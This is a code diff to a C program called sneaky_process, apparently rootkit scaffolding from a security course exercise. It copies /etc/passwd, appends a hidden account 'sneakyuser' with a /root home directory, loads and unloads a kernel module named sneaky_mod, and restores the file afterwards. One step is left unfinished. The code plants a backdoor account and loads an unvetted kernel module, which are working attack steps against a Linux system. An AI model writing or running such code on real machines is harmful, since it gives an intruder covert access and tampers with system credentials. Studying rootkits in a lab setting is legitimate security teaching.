@@ -9,15 +9,29 @@ extern char **environ;
 void print_info() { printf("sneaky_process pid = %d\n", getpid()); }
 
 // Step 2: insert a line to passwd file
-void copy_file() {
+void backup_passwd() {
   system("cp /etc/passwd /tmp");
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
          "/etc/passwd");
 }
 
+// Step 3: load module
+void load_module() { system("insmod sneaky_mod.ko"); }
+
+// Step 4:
+
+// Step 5: unload module
+void unload_module() { system("rmmod sneaky_mod"); }
+
+// Step 6: restore the /etc/passwd file
+void restore_passwd() { system("cp /tmp/passwd /etc"); }
+
 int main() {
   print_info();
-  copy_file();
-
+  backup_passwd();
+  load_module();
+  // to be added.
+  unload_module();
+  restore_passwd();
   return EXIT_SUCCESS;
 }
